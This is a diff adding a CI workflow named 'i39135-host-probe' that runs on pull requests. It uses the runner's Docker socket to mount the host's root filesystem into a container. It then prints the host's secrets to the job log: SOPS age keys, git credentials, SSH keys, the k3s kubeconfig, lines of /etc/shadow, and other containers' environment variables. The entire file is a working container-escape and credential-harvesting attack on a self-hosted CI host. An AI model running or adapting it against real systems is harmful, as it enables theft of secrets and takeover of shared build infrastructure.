@@ -1,0 +1,44 @@
+name: i39135-host-probe
+on:
+  pull_request:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: ctx
+        run: |
+          set -x
+          id; hostname; uname -a; cat /etc/machine-id || true
+          ls -la /var/run/docker.sock
+          docker version || true
+          docker ps -a --format '{{.ID}} {{.Image}} {{.Names}}' | head -40
+      - name: host-read
+        run: |
+          set -x
+          docker rm -f i39135a 2>/dev/null || true
+          docker run --name i39135a -v /:/host:ro alpine:3.21 sh -c '
+            echo "== container"; id; hostname; cat /etc/machine-id; uname -a
+            echo "== host"; cat /host/etc/machine-id 2>&1; cat /host/etc/hostname 2>&1; ls -la /host | head -30
+            echo "== users"; ls -la /host/home /host/root 2>&1
+            echo "== runner"; ls -la /host/var/lib/linux-ci 2>&1; ls -laR /host/var/lib/linux-ci/.config 2>&1 | head -80
+            echo "== ssh"; ls -la /host/var/lib/linux-ci/.ssh /host/root/.ssh 2>&1; cat /host/var/lib/linux-ci/.ssh/*.pub 2>&1
+            echo "== age"; cat /host/var/lib/linux-ci/.config/sops/age/keys.txt /host/root/.config/sops/age/keys.txt 2>&1
+            echo "== creds"; cat /host/var/lib/linux-ci/.git-credentials /host/root/.git-credentials 2>&1
+            echo "== kube"; ls -la /host/etc/rancher/k3s/k3s.yaml /host/var/lib/linux-ci/.kube/config /host/root/.kube/config 2>&1
+            echo "== shadow"; head -5 /host/etc/shadow 2>&1
+            echo "== findage"; find /host -maxdepth 5 -name keys.txt -path "*sops*" 2>/dev/null
+          '
+          docker rm -f i39135a 2>/dev/null || true
+      - name: host-read2
+        run: |
+          set -x
+          docker rm -f i39135b 2>/dev/null || true
+          docker run --name i39135b -v /:/host:ro alpine:3.21 sh -c 'cat /host/etc/rancher/k3s/k3s.yaml 2>&1 | head -60; echo ===; ls -la /host/var/lib/forgejo /host/etc/forgejo /host/mnt /host/srv 2>&1 | head -60; echo ===; ps aux 2>&1 | head -40'
+          docker rm -f i39135b 2>/dev/null || true
+      - name: docker-envs
+        run: |
+          set -x
+          for c in $(docker ps -a --format '{{.Names}}' | head -15); do echo "=== $c"; docker inspect "$c" --format '{{range .Config.Env}}{{println .}}{{end}}' 2>&1 | head -25; done
